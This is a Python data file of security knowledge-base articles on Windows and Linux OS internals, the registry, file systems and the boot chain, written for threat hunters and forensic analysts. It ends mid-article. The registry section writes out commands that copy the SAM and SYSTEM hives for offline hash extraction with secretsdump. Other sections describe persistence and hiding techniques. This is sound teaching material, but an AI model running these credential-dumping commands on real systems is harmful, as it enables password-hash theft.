"""Built-in KB data: Extended Foundations Articles."""

OS_INTERNALS = [
    {
        "title": "Windows Process Architecture — Kernel Mode, User Mode, and System Processes",
        "tags": ["windows", "processes", "kernel", "architecture", "os-internals"],
        "content": r"""# Windows Process Architecture — Kernel Mode, User Mode, and System Processes

## The Two Worlds: Kernel Mode vs User Mode

Windows splits execution into two privilege levels enforced by the CPU:

```
+--------------------------------------------------+
|              USER MODE (Ring 3)                  |
|  Applications, Services, Subsystem DLLs          |
|  Limited hardware access — must call kernel API  |
+--------------------------------------------------+
          | System Call (SYSCALL/SYSENTER)
          v
+--------------------------------------------------+
|             KERNEL MODE (Ring 0)                 |
|  NT Kernel (ntoskrnl.exe), HAL, Drivers          |
|  Full hardware access — no restrictions          |
+--------------------------------------------------+
```

**User mode** code cannot directly access hardware or arbitrary memory. Every privileged operation requires a transition to kernel mode via a system call. This boundary is the foundation of Windows security — a crashed user mode process doesn't bring down the system, and a compromised application can't directly read kernel memory.

**Kernel mode** code runs with full CPU privileges. Device drivers, the Hardware Abstraction Layer (HAL), and the NT Executive all operate here. A bug in kernel mode causes a Blue Screen of Death (BSOD).

## Core System Processes

Understanding which processes are legitimate is essential for threat hunting. These should always be present:

### System Idle Process (PID 0)
- Represents idle CPU time
- Never has threads visible in Task Manager
- Fake entries at PID 0 are suspicious

### System (PID 4)
- The kernel itself — hosts kernel threads
- Parent: None (or itself)
- Has no image path on disk
- Suspicious if it has child processes other than smss.exe

### smss.exe — Session Manager Subsystem
- First user-mode process started by the kernel
- Launches csrss.exe and wininit.exe
- Only one instance should exist under System (PID 4)
- Lives in `C:\\Windows\\System32\\smss.exe`

### csrss.exe — Client/Server Runtime Subsystem
- Manages Win32 console windows and process/thread lifecycle
- One instance per session (Session 0 + one per logged-in user)
- Parent: smss.exe
- **Never** has a GUI window; suspicious if spawning cmd.exe children

### wininit.exe
- Session 0 initializer — launches services.exe, lsass.exe, lsm.exe
- Only one instance, Session 0
- Parent: smss.exe

### services.exe — Service Control Manager (SCM)
- Starts and manages Windows services
- Parent: wininit.exe
- Spawns svchost.exe instances
- Suspicious: multiple instances, wrong parent, network connections

### lsass.exe — Local Security Authority Subsystem
- Handles authentication (Kerberos, NTLM, credential storage)
- Target of credential dumping (Mimikatz, procdump)
- Parent: wininit.exe
- **Only one instance should exist**
- Suspicious: spawning child processes, high memory, unexpected modules loaded

```powershell
# Check lsass parent and modules
Get-Process lsass | Select-Object Id, CPU, WorkingSet
# Via Sysinternals Process Explorer — check parent PID
# Expected parent: wininit.exe
```

### svchost.exe — Service Host
- Hosts multiple Windows services in a shared process
- Multiple instances are normal
- Each should have `-k <group>` parameter
- Suspicious: no `-k` parameter, wrong parent, network on unusual ports

```powershell
# List all svchost instances and their hosted services
Get-WmiObject Win32_Service | Where-Object {$_.PathName -like "*svchost*"} |
    Select-Object Name, PathName, State | Sort-Object PathName
```

### winlogon.exe
- Manages the secure attention sequence (Ctrl+Alt+Del)
- Handles user logon/logoff, screen locks
- One per interactive session
- Parent: smss.exe

## Process Relationships (Normal Tree)

```
System (4)
  └─ smss.exe
       ├─ csrss.exe (Session 0)
       ├─ csrss.exe (Session 1)
       ├─ wininit.exe
       │    ├─ services.exe
       │    │    ├─ svchost.exe -k netsvcs
       │    │    ├─ svchost.exe -k LocalService
       │    │    └─ ... (many svchost instances)
       │    ├─ lsass.exe
       │    └─ lsm.exe
       └─ winlogon.exe
            └─ userinit.exe
                 └─ explorer.exe
                      └─ [user applications]
```

## Threat Hunting: Process Anomalies

| Indicator | Normal | Suspicious |
|-----------|--------|------------|
| lsass.exe instances | 1 | >1 |
| lsass.exe parent | wininit.exe | anything else |
| services.exe instances | 1 | >1 |
| svchost.exe with no -k | Never | Present |
| csrss.exe spawning cmd | Never | Present |
| explorer.exe parent | userinit.exe | winlogon direct or cmd.exe |

```powershell
# Hunt for suspicious parent-child relationships
$processes = Get-WmiObject Win32_Process
foreach ($proc in $processes) {
    $parent = $processes | Where-Object {$_.ProcessId -eq $proc.ParentProcessId}
    if ($proc.Name -eq "lsass.exe" -and $parent.Name -ne "wininit.exe") {
        Write-Warning "Suspicious lsass parent: $($parent.Name) (PID $($proc.ParentProcessId))"
    }
}
```

## Security Boundaries

**Protected Processes (PP) and PPL**: Windows Vista+ introduced Protected Processes. lsass.exe can run as PPL (Protected Process Light), preventing even admin-level processes from opening it with PROCESS_VM_READ — defeating most credential dumpers.

**Mandatory Integrity Control (MIC)**: Every process has an integrity level:
- System (0x4000) — kernel, system processes
- High (0x3000) — elevated admin processes
- Medium (0x2000) — standard user processes
- Low (0x1000) — sandboxed processes (IE Protected Mode)
- Untrusted (0x0000) — highly restricted

A lower integrity process cannot write to a higher integrity object — this is why UAC elevation is needed.
""",
    },
    {
        "title": "Windows Memory Management — Virtual Memory, Paging, and Working Sets",
        "tags": ["windows", "memory", "virtual-memory", "paging", "os-internals"],
        "content": r"""# Windows Memory Management — Virtual Memory, Paging, and Working Sets

## Virtual Memory Architecture

Every Windows process gets its own virtual address space — a private view of memory that the OS maps to physical RAM (or disk). On 64-bit Windows, each process has a 128 TB user-mode virtual address space.

```
Virtual Address Space (64-bit process)
+----------------------------------+ 0xFFFFFFFFFFFFFFFF
|        Kernel Space              | (accessible only in kernel mode)
|      128 TB                      |
+----------------------------------+ 0xFFFF800000000000
|    [Non-canonical gap]           |
+----------------------------------+ 0x00007FFFFFFFFFFF
|        User Space                |
|      128 TB                      |
|  Code, stack, heap, DLLs         |
+----------------------------------+ 0x0000000000000000
```

## Page Tables and Address Translation

When a process accesses a virtual address, the CPU's Memory Management Unit (MMU) walks a multi-level page table to translate it to a physical address. On x64 Windows this is a 4-level hierarchy (PML4 → PDPT → PD → PT).

```
Virtual Address (48 bits used):
[PML4 index 9b][PDPT index 9b][PD index 9b][PT index 9b][Page offset 12b]
     ↓               ↓              ↓             ↓
  CR3 register   PML4 entry    PDPT entry     PD entry    → Physical Frame
```

Each page table entry contains:
- Physical frame number
- Present bit (is the page in RAM?)
- Write bit (can this page be written?)
- User/Supervisor bit (accessible from user mode?)
- Execute-Disable (NX) bit (can code execute here?)

## Page States

A virtual page can be in one of three states:

**Free** — Not allocated, accessing it causes an access violation.

**Reserved** — Address range claimed but no physical storage committed. Used to reserve address ranges for future use (e.g., thread stacks reserve 1 MB but initially commit only a few pages).

**Committed** — Backed by physical RAM or the paging file. Divided by protection:
- `PAGE_EXECUTE_READ` — code pages
- `PAGE_READWRITE` — data/heap/stack
- `PAGE_EXECUTE_READWRITE` — suspicious (shellcode staging)
- `PAGE_NOACCESS` — guard pages at stack limits

```powershell
# List committed memory regions in a process
# (requires Sysinternals VMMap or WinDbg)
# PowerShell: use VirtualQueryEx via P/Invoke

# Quick check for RWX pages (malware indicator) using Sysinternals
vmmap.exe -accepteula <PID>
```

## The Paging File (pagefile.sys)

When physical RAM is exhausted, the Memory Manager moves infrequently accessed pages to `C:\\pagefile.sys`. This is transparent to applications.

**Security implications:**
- Pagefile can contain fragments of sensitive data (passwords, keys, documents)
- On shutdown, the pagefile is NOT cleared by default
- `ClearPageFileAtShutdown` registry value can enable clearing (performance cost)
- Forensic tools can recover artifacts from pagefile

```
Registry: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
Value: ClearPageFileAtShutdown = 1  (enable clearing)
```

## Working Sets

A process's **working set** is the subset of its virtual pages currently resident in physical RAM. Windows uses a working set manager to balance memory across processes:

- **Hard faults** (page faults requiring disk I/O) — expensive, causes noticeable slowdown
- **Soft faults** — page is in RAM but not in this process's working set — cheap resolution

```powershell
# View working set sizes
Get-Process | Sort-Object WorkingSet64 -Descending |
    Select-Object -First 10 Name, Id,
    @{N="WorkingSet_MB";E={[math]::Round($_.WorkingSet64/1MB,1)}}
```

## Heap and Stack

**Stack** — Per-thread, fixed size (default 1 MB reserved, grows on demand up to limit). Stores local variables, return addresses, saved registers. Stack overflow = exception.

**Heap** — Dynamic allocation via `VirtualAlloc`/`HeapAlloc`. Process default heap plus additional heaps created by the process. Fragmentation and heap corruption vulnerabilities live here.

**Security relevance for analysts:**
- Stack buffer overflows overwrite return addresses → code execution
- Heap spraying fills the heap with shellcode to increase exploitation reliability
- Use-After-Free bugs stem from accessing freed heap memory

## Memory Protection Features

**ASLR (Address Space Layout Randomization)** — Randomizes base addresses of executables, DLLs, stack, and heap. Makes ROP gadget addresses unpredictable.

**DEP/NX (Data Execution Prevention)** — Marks data pages as non-executable. Prevents direct shellcode execution on the stack or heap.

**CFG (Control Flow Guard)** — Validates indirect call targets at runtime. Mitigates JIT spraying and ROP chains.

**Heap Encryption** — Heap metadata (free list pointers) is XOR-encoded with a random cookie since Windows Vista, defeating heap metadata overwrites.

```powershell
# Check ASLR/DEP status for a process (requires Sysinternals Process Explorer)
# Or via PowerShell with Get-ProcessMitigation (Windows 10+)
Get-ProcessMitigation -Name lsass.exe
```

## Memory Forensics Relevance

For incident responders, memory analysis reveals:
- Injected code (processes with RWX regions containing PE headers)
- Hollow processes (legitimate process with replaced memory content)
- In-memory malware that never touches disk
- Encryption keys and plaintext credentials before they're wiped

Tools: Volatility Framework, Rekall, WinPmem (memory acquisition)
""",
    },
    {
        "title": "Linux Process Model — fork/exec, Namespaces, Cgroups, and /proc",
        "tags": ["linux", "processes", "namespaces", "cgroups", "proc", "os-internals"],
        "content": r"""# Linux Process Model — fork/exec, Namespaces, Cgroups, and /proc

## The fork/exec Model

Linux creates processes through two system calls working in tandem:

**fork()** — Creates an exact copy of the calling process. The child gets a new PID but inherits the parent's memory (copy-on-write), open file descriptors, and signal handlers.

**exec()** — Replaces the current process image with a new program. The new program starts from scratch (new code/data/stack) but keeps the same PID and inherited file descriptors.

```
Shell runs "ls -la":
1. shell calls fork()     → creates child process (copy of shell)
2. child calls exec(ls)   → replaces child's memory with ls binary
3. ls runs, outputs, exits
4. shell's wait() returns → shell continues
```

This split design is elegant — between fork and exec the child can manipulate its environment (close files, set up pipes, change UID) before exec replaces the image.

```bash
# Trace process creation
strace -e trace=clone,execve bash -c "ls /tmp" 2>&1 | head -20

# View process tree
pstree -p
ps axjf  # Shows parent-child relationships
```

## Process Identifiers

Every process has several identity values:

| ID | Name | Description |
|----|------|-------------|
| PID | Process ID | Unique process identifier |
| PPID | Parent PID | The process that created this one |
| UID/EUID | User/Effective UID | Who owns this process vs effective privilege |
| GID/EGID | Group/Effective GID | Group membership |
| SID | Session ID | Process group for job control |

**EUID vs UID**: When a setuid binary runs (e.g., `/usr/bin/sudo`), EUID becomes 0 (root) while UID remains the calling user. This distinction is how sudo elevates without changing the real user identity.

```bash
# See all IDs for current shell
cat /proc/self/status | grep -E "^(Pid|PPid|Uid|Gid)"
id  # Shows uid, gid, groups
```

## The /proc Filesystem

`/proc` is a virtual filesystem — no files exist on disk. The kernel synthesizes content on read. It is the primary interface for process introspection.

```
/proc/
├── [PID]/              # One directory per running process
│   ├── cmdline         # Full command line (null-separated)
│   ├── exe             → symlink to executable
│   ├── fd/             # Open file descriptors (symlinks)
│   ├── maps            # Memory map (virtual address regions)
│   ├── net/            # Network state (TCP connections)
│   ├── status          # Human-readable process status
│   ├── environ         # Environment variables
│   └── smaps           # Detailed memory usage per region
├── cpuinfo             # CPU details
├── meminfo             # System memory statistics
└── net/tcp             # All TCP connections system-wide
```

```bash
# Incident response — check a suspicious process
PID=1234
cat /proc/$PID/cmdline | tr '\0' ' '    # Full command line
ls -la /proc/$PID/exe                   # What binary is running?
ls -la /proc/$PID/fd/                   # Open files/sockets
cat /proc/$PID/maps | grep rwx          # RWX memory regions (shellcode?)
cat /proc/$PID/net/tcp                  # Active connections

# Find processes with deleted executables (common malware evasion)
ls -la /proc/*/exe 2>/dev/null | grep deleted
```

## Linux Namespaces

Namespaces isolate process views of system resources — the foundation of containers:

| Namespace | Isolates | Use Case |
|-----------|----------|----------|
| pid | Process IDs | Containers have their own PID 1 |
| net | Network stack | Container gets its own interfaces |
| mnt | Mount points | Container filesystem isolation |
| uts | Hostname/domain | Container can have its own hostname |
| ipc | SysV IPC, POSIX MQ | IPC isolation between containers |
| user | UIDs/GIDs | Container root ≠ host root |
| cgroup | cgroup root | Nested resource control |

```bash
# View namespaces for a process
ls -la /proc/$PID/ns/

# Enter a container's namespace (for debugging)
nsenter --target $PID --mount --uts --ipc --net --pid -- bash

# List all network namespaces
ip netns list
```

**Security implication**: Container breakout vulnerabilities exploit namespace boundary weaknesses. A process inside a container that escapes its namespaces can see/affect the host.

## Cgroups (Control Groups)

Cgroups limit and account for resource usage by process groups:

```
/sys/fs/cgroup/
├── cpu/            # CPU time limits
├── memory/         # Memory limits and accounting
├── blkio/          # Block I/O throttling
├── net_cls/        # Network packet classification
└── pids/           # Limit number of processes
```

```bash
# Find which cgroup a process belongs to
cat /proc/$PID/cgroup

# Check memory limit for a cgroup
cat /sys/fs/cgroup/memory/docker/<container_id>/memory.limit_in_bytes

# See how much memory a container has used
cat /sys/fs/cgroup/memory/docker/<container_id>/memory.usage_in_bytes
```

**Security use**: Cgroups can limit damage from a compromised process — a cryptominer can't consume all CPU if cgroup limits are set. Resource exhaustion attacks (fork bombs) are stopped by the `pids` cgroup.

```bash
# Protect against fork bombs with pids cgroup (systemd unit)
# In /etc/systemd/system/myservice.service:
# [Service]
# TasksMax=50
```

## Signal Handling

Signals are asynchronous notifications sent to processes:

```bash
kill -l          # List all signals
kill -9 $PID     # SIGKILL — cannot be caught or ignored
kill -15 $PID    # SIGTERM — graceful shutdown (default)
kill -1 $PID     # SIGHUP — often triggers config reload

# Find and kill by name
pkill -f "suspicious_process"
killall -9 malware
```

**SIGKILL (9)** cannot be intercepted. **SIGTERM (15)** allows clean shutdown. Malware may catch SIGTERM to resist termination — use SIGKILL for forced removal.

## Capabilities

Linux capabilities divide root privileges into granular units, allowing processes to have specific elevated abilities without full root:

```bash
# View capabilities of a process
cat /proc/$PID/status | grep Cap
capsh --decode=0000003fffffffff  # Decode the hex bitmask

# Common capabilities
CAP_NET_ADMIN     # Network configuration
CAP_NET_RAW       # Raw packet crafting (tcpdump needs this)
CAP_SYS_PTRACE    # Attach to other processes (debuggers)
CAP_DAC_OVERRIDE  # Bypass file permission checks
CAP_SETUID        # Arbitrary UID switching

# Security concern: CAP_SYS_PTRACE allows reading other process memory
# → credential theft without needing /proc/PID/mem root access
```
""",
    },
    {
        "title": "Windows Registry Deep Dive — Hives, Keys, Value Types, and Security Paths",
        "tags": ["windows", "registry", "persistence", "forensics", "os-internals"],
        "content": r"""# Windows Registry Deep Dive — Hives, Keys, Value Types, and Security Paths

## Registry Architecture

The Windows Registry is a hierarchical database storing OS and application configuration. It is organized into **hives** — discrete units stored as files on disk.

```
Registry Root Keys (Hives):
┌─────────────────────────────────────────────────────────────────┐
│ HKEY_LOCAL_MACHINE (HKLM)   → Machine-wide settings            │
│   Backed by: SYSTEM, SOFTWARE, SAM, SECURITY, HARDWARE hives   │
├─────────────────────────────────────────────────────────────────┤
│ HKEY_CURRENT_USER (HKCU)    → Current user's settings          │
│   Backed by: NTUSER.DAT in user's profile                      │
├─────────────────────────────────────────────────────────────────┤
│ HKEY_USERS (HKU)            → All loaded user profiles         │
├─────────────────────────────────────────────────────────────────┤
│ HKEY_CLASSES_ROOT (HKCR)    → File associations, COM objects   │
│   Merged view of HKLM\\SOFTWARE\\Classes + HKCU\\SOFTWARE\\Classes│
└─────────────────────────────────────────────────────────────────┘
```

## Hive Files on Disk

```
C:\Windows\System32\config\
├── SYSTEM       → HKLM\SYSTEM (services, boot config)
├── SOFTWARE     → HKLM\SOFTWARE (installed apps, OS settings)
├── SAM          → HKLM\SAM (local account password hashes)
├── SECURITY     → HKLM\SECURITY (LSA secrets, cached creds)
└── HARDWARE     → Built in memory, not stored on disk

C:\Users\<username>\
├── NTUSER.DAT   → HKCU (user preferences, MRU lists)
└── AppData\Local\Microsoft\Windows\UsrClass.dat → HKCU\Classes
```

SAM and SECURITY hives are locked while Windows runs. Attackers use Volume Shadow Copies or registry save commands to extract them offline:
```bash
# Copy locked hives (run as admin)
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
# Then use secretsdump.py or Impacket to extract hashes
```

## Value Types

| Type | Name | Description | Example |
|------|------|-------------|---------|
| REG_SZ | String | Plain text string | "C:\\Windows\\notepad.exe" |
| REG_EXPAND_SZ | Expandable string | Contains %variables% | "%SystemRoot%\\system32" |
| REG_DWORD | 32-bit integer | Flags, booleans, counters | 0x00000001 |
| REG_QWORD | 64-bit integer | Large numbers, timestamps | 0x01D5F3... |
| REG_BINARY | Binary data | Raw bytes, certificates | hex bytes |
| REG_MULTI_SZ | Multi-string | Null-separated list | "val1\0val2\0\0" |

## Critical Security-Relevant Paths

### Autorun / Persistence Locations

```
# Run keys — execute on every user logon
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# RunOnce — execute once then deleted
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Services
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
  Key: Start   (2=Automatic, 3=Manual, 4=Disabled)
  Key: ImagePath (path to service binary — check for tampering)
  Key: Type    (16=own process, 32=shared process, 1=kernel driver)

# Scheduled Tasks (legacy)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks

# AppInit_DLLs — DLL injected into every process loading user32.dll
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
# Should be empty — any value here is highly suspicious

# Image File Execution Options (IFEO) — Debugger hijacking
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>
# Attackers set "Debugger" = "cmd.exe" to intercept process launches
```

### Credential Storage Paths

```
# LSA Secrets (service account passwords, cached domain creds)
HKLM\SECURITY\Policy\Secrets  (SYSTEM-only access)

# Cached domain credentials
HKLM\SECURITY\Cache

# Stored credentials (Windows Credential Manager)
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\

# Recent Documents / MRU Lists (forensic gold)
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\Software\Microsoft\Office\<version>\<app>\File MRU
```

### Network Configuration

```
# DNS cache (persisted between reboots in some configs)
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters

# Network interfaces
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\

# Recently connected networks
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```

## Registry Auditing and Forensics

```powershell
# Query a key
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# List all Run key entries
Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" |
    Select-Object -ExpandProperty Property | ForEach-Object {
        $val = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run").$_
        [PSCustomObject]@{Name=$_; Value=$val}
    }

# Monitor registry changes (audit policy must be enabled first)
# Event ID 4657 = Registry value modified
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4657} |
    Select-Object TimeCreated, Message -First 20

# Enable registry auditing on a key
$acl = Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$rule = New-Object System.Security.AccessControl.RegistryAuditRule(
    "Everyone", "SetValue,CreateSubKey", "All", "None", "Success,Failure")
$acl.AddAuditRule($rule)
Set-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" $acl
```

## Registry Forensics: Last Write Times

Each registry key stores a LastWriteTime timestamp — valuable for timeline analysis:

```powershell
# Get last write time of a key
(Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run").LastWriteTime

# Recursive search for recently modified keys
function Get-RegistryLastWrite {
    param($Path, $After)
    $key = Get-Item $Path -ErrorAction SilentlyContinue
    if ($key -and $key.LastWriteTime -gt $After) {
        Write-Output "$($key.LastWriteTime) - $Path"
    }
    foreach ($sub in (Get-ChildItem $Path -ErrorAction SilentlyContinue)) {
        Get-RegistryLastWrite -Path $sub.PSPath -After $After
    }
}
Get-RegistryLastWrite -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion" `
    -After (Get-Date).AddDays(-7)
```
""",
    },
    {
        "title": "File Systems Compared — NTFS, ext4, APFS, XFS Security Features",
        "tags": ["filesystem", "ntfs", "ext4", "apfs", "xfs", "security", "os-internals"],
        "content": r"""# File Systems Compared — NTFS, ext4, APFS, XFS Security Features

## Why File System Knowledge Matters for Security

File system internals affect how malware hides, how forensic artifacts persist, and which security controls are available. Understanding the differences helps analysts know where to look and what tools to use.

## NTFS (New Technology File System) — Windows

NTFS is the dominant Windows file system, with rich metadata and security features.

### Key Structures

**MFT (Master File Table)** — The heart of NTFS. Every file and directory has at least one MFT record (1 KB each). Even deleted files leave MFT records until overwritten. Forensic tools parse the MFT directly to recover deleted files and build timelines.

**$MFT** — The MFT itself is stored as a file (`$MFT`) at the root. You can extract it with:
```powershell
# Extract MFT for forensic analysis
Copy-Item -Path "\\.\C:\$MFT" -Destination C:\forensics\mft.bin
# Parse with MFTECmd, Autopsy, or Plaso
```

**Timestamps — MACE**: Each NTFS file has four timestamps stored in the MFT:
- **M** — Modified (last content change)
- **A** — Accessed (last read)
- **C** — Changed ($MFT entry modified)
- **E** — Entry (file creation time)

Attackers use **timestomping** to alter these to evade timeline analysis. The `$STANDARD_INFORMATION` attribute (visible to tools) can be altered, but the `$FILE_NAME` attribute (updated by the kernel) is harder to forge.

### NTFS Alternate Data Streams (ADS)

Files can have multiple named data streams. The default stream is unnamed; additional streams are hidden from normal directory listings:

```powershell
# Create an ADS
echo "hidden data" > C:\file.txt:hidden_stream

# List ADS (normal dir doesn't show them)
Get-Item C:\file.txt -Stream *

# Read ADS
Get-Content C:\file.txt:hidden_stream

# Check all ADS in a directory (malware hides in ADS)
Get-ChildItem -Recurse | Get-Item -Stream * |
    Where-Object {$_.Stream -ne ':$DATA'} |
    Select-Object FileName, Stream, Length
```

**Zone.Identifier** ADS: Windows attaches this to downloaded files (Mark of the Web), enabling Smart Screen warnings. Attackers may strip it.

### NTFS Permissions (ACLs)

NTFS uses Discretionary ACLs (DACLs) and System ACLs (SACLs):
```powershell
# View permissions
icacls C:\sensitivedata\
Get-Acl C:\sensitivedata\ | Format-List

# Audit who reads a file (SACL — requires audit policy enabled)
# Event ID 4663 = Object access (file read/write)
```

### NTFS Journaling

`$LogFile` — Operation journal for crash recovery. Contains recent file operations — useful for forensics.
`$UsnJrnl` — Change journal recording all file creates/deletes/renames. Valuable for incident response:
```powershell
# Parse the USN Journal
fsutil usn readjournal C: csv | ConvertFrom-Csv |
    Where-Object {$_.TimeStamp -gt (Get-Date).AddHours(-24)} |
    Select-Object TimeStamp, FileName, Reason
```

## ext4 — Linux

The default Linux file system for most distributions.

### Inodes

Each file is represented by an **inode** storing metadata (permissions, timestamps, owner, size) but NOT the filename (filenames live in directory entries). Hard links are multiple directory entries pointing to the same inode.

```bash
# View inode details
stat /etc/passwd
ls -i /etc/passwd    # Shows inode number

# Find all hard links to an inode
find / -inum <inode_number> 2>/dev/null
```

**Deletion forensics**: When a file is deleted, the inode's link count drops to zero and the inode is marked free — but data blocks aren't zeroed. Recovery tools (extundelete, TestDisk) can recover recently deleted files before the blocks are reused.

### ext4 Timestamps

ext4 stores three timestamps per inode: atime (access), mtime (modify), ctime (change — inode change, not creation). **Creation time** (crtime) was added in ext4 and is visible via `debugfs`:

```bash
debugfs -R "stat <inode>" /dev/sda1
# Shows crtime (creation time) not visible via stat
```

### Extended Attributes and SELinux Labels

```bash
# View extended attributes (security labels, capabilities)
getfattr -d /usr/bin/sudo
# security.selinux label controls what this process can access

# List files with capabilities (privilege escalation concern)
find / -xdev -exec getcap {} \; 2>/dev/null
# Example: cap_net_raw+ep on ping
```

## APFS (Apple File System) — macOS/iOS

Apple's modern file system (2017+) with strong security focus:

**Encryption built-in**: APFS supports per-file encryption with 256-bit AES-XTS. On modern Macs with T2/Apple Silicon, encryption keys are tied to the Secure Enclave — decryption requires biometric or PIN authentication.

**Snapshots**: APFS supports copy-on-write snapshots, used by Time Machine. Each snapshot is a point-in-time consistent view of the volume — forensically valuable.

**Clones**: Files can be cloned instantly (no data copy until written) — useful but complicates deduplication.

**Sparse Files**: Holes in files are stored efficiently — relevant for forensic carving.

```bash
# macOS: List APFS volumes
diskutil list

# Check encryption status
diskutil info / | grep "FileVault"

# List snapshots
tmutil listlocalsnapshots /
```

## XFS — Linux (RHEL Default)

XFS excels at large files and high-performance workloads. Used as the default on RHEL/CentOS 7+.

**Key security features:**
- Full POSIX ACLs and extended attributes (same as ext4)
- Project quotas — limit disk usage per directory tree (useful for containing log directories)
- Metadata journaling ensures consistency after crash
- Reverse mapping (rmap) B-tree: tracks which inode owns each block — aids forensic analysis

```bash
# XFS info
xfs_info /dev/sda1

# XFS metadata dump (forensic)
xfs_metadump /dev/sda1 metadump.bin
xfs_mdrestore metadump.bin /dev/sdb1

# Quota report
xfs_quota -x -c 'report -h' /data
```

## Security Feature Comparison

| Feature | NTFS | ext4 | APFS | XFS |
|---------|------|------|------|-----|
| ACLs | Yes (rich) | POSIX ACLs | POSIX ACLs | POSIX ACLs |
| Encryption | EFS (deprecated), BitLocker | LUKS (volume) | Native per-file | LUKS (volume) |
| Journaling | Yes ($LogFile) | Yes | Yes | Yes |
| Snapshots | VSS (separate) | No native | Native | No native |
| ADS | Yes | No | Named forks | No |
| Forensic artifacts | MFT, $UsnJrnl, $LogFile | inode table, journal | Snapshots, B-tree | rmap, journal |
| Timestamps | 4 (MACE) | 3 (+crtime) | 4 | 3 |
""",
    },
    {
        "title": "Boot Process — BIOS vs UEFI, Secure Boot, and the Bootloader Chain",
        "tags": ["boot", "uefi", "bios", "secure-boot", "bootkit", "os-internals"],
        "content": r"""# Boot Process — BIOS vs UEFI, Secure Boot, and the Bootloader Chain

## Why the Boot Process Matters for Security

Bootkits — malware that infects the boot process — can load before the OS, before security tools, and before any user-space defenses. Understanding the boot chain helps analysts investigate persistence at the deepest level.

## Legacy BIOS Boot Process

```
Power On
    ↓
POST (Power-On Self-Test)
    ↓
BIOS reads first sector of boot device (MBR — 512 bytes)
    ↓
MBR contains: Boot code (446B) + Partition table (64B) + Signature (0x55AA)
    ↓
MBR code locates active partition → loads Volume Boot Record (VBR)
    ↓
VBR loads bootloader (NTLDR for XP, bootmgr for Vista+)
    ↓
bootmgr reads BCD (Boot Configuration Database)
    ↓
winload.exe loads Windows kernel (ntoskrnl.exe) + HAL
    ↓
ntoskrnl initializes, loads drivers, starts Session Manager
```

**MBR Rootkit Attack**: Malware overwrites the MBR to execute before Windows. The TDL4 (TDSS/Alureon) bootkit used this technique. Detection: compare live MBR to known-good.

```powershell
# Read the raw MBR (Windows, run as admin)
$disk = [System.IO.File]::OpenRead("\\.\PhysicalDrive0")
$mbr = New-Object byte[] 512
$disk.Read($mbr, 0, 512)
$disk.Close()
[System.BitConverter]::ToString($mbr[0..10])  # First bytes of boot code
```

## UEFI Boot Process

UEFI replaces BIOS on all modern hardware (since ~2012). It introduces:

```
Power On
    ↓
UEFI Firmware (stored in SPI flash on motherboard)
    ↓
SEC (Security) Phase — minimal hardware init
    ↓
PEI (Pre-EFI Init) — memory initialization, early platform config
    ↓
DXE (Driver Execution Environment) — loads drivers from UEFI firmware
    ↓
BDS (Boot Device Selection) — reads NVRAM boot entries
    ↓
Loads EFI boot application from EFI System Partition (ESP)
    → Windows: \EFI\Microsoft\Boot\bootmgfw.efi
    → Linux: \EFI\ubuntu\grubx64.efi
    ↓
EFI bootloader loads OS kernel
```

**EFI System Partition (ESP)**: A FAT32 partition (usually ~100 MB) at the start of the disk containing all EFI boot applications. It is unencrypted — malware can plant EFI applications here that persist across OS reinstalls.

```bash
# Linux: Mount and inspect ESP
mount /dev/sda1 /mnt/efi
ls -la /mnt/efi/EFI/
# Unexpected directories here = suspicious

# Windows: Mount ESP to see contents
mountvol X: /S
dir X:\EFI\

# List UEFI boot entries (Windows)
bcdedit /enum firmware
```

## Secure Boot

Secure Boot is a UEFI feature that cryptographically verifies every component in the boot chain before executing it.

### How It Works

```
UEFI Firmware (trusted anchor)
    ↓ verifies signature using db (Signature Database)
EFI Boot Application (e.g., bootmgfw.efi) must be signed by key in db
    ↓ verifies
Bootloader (bootmgr) must be signed
    ↓ verifies
Windows Boot Loader (winload.efi) must be signed
    ↓ enforces
Kernel must be signed; unsigned drivers blocked
```

**Key Databases:**
- **PK** (Platform Key): Root of trust, owned by manufacturer
- **KEK** (Key Exchange Key): Used to update db/dbx
- **db** (Signature Database): Allowed signers/hashes
- **dbx** (Forbidden Database): Explicitly blocked keys/hashes (revocation)

**MOK (Machine Owner Key)** — Linux mechanism to enroll custom keys (e.g., for custom kernel modules) into Secure Boot without disabling it.

### Bypassing Secure Boot: Real Attacks

**BootHole (CVE-2020-10713)**: Buffer overflow in GRUB2's config parser. Even with Secure Boot enabled, the signed GRUB2 binary could be exploited. Microsoft and distros issued dbx updates to block vulnerable GRUB2 hashes.

**BlackLotus (2023)**: First public UEFI bootkit to bypass Secure Boot on fully patched Windows 11. Exploited CVE-2022-21894 (Baton Drop). Planted in EFI partition, persisted through OS reinstall.

**UEFI firmware implants** (LoJax, MosaicRegressor): Write to SPI flash directly — survive disk replacement. Require direct hardware or firmware-level access to remove.

## Windows Boot Configuration Database (BCD)

```powershell
# View BCD entries
bcdedit /enum all

# Key entries to check for tampering:
# {bootmgr} - Windows Boot Manager path
